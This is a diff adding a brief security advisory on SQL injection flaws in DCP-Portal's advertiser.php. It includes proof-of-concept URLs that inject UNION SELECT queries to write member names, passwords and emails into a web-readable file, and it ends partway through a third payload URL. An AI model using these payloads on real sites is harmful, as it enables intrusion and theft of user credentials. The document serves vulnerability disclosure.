@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/8739/info
+
+Multiple SQL Injection vulnerabilities have been discovered that affect DCP-Portal scripts. These issues are likely due to a lack of sufficient sanitization performed on user supplied URI parameters. Attacks have been demonstrated that inject partial SQL queries, as values for URI parameters, in a manner that influences DCP-Portal SQL query logic to the attackers benefit.
+
+An attacker may exploit these conditions to disclose DCP Portal credentials, reset user passwords, or perform a denial of service type attack via email spamming.
+
+
+http://www.example.com/dcp/advertiser.php?adv_logged=1&username=1&password=qwe' or 1=1 UNION select uid,name,password,surname,job,email from dcp5_members into outfile'c:/apache2/htdocs/dcpad.txt
+
+http://www.example.com/dcp/advertiser.php?adv_logged=1&username=1&password=qwe' or 1=1 UNION select uid,name,password,surname,job,email from dcp5_members into outfile'/var/www/html/dcpad.txt
+
+http://www.example.com/dcp/advertiser.php?adv_logged=1&username=1&password=' 
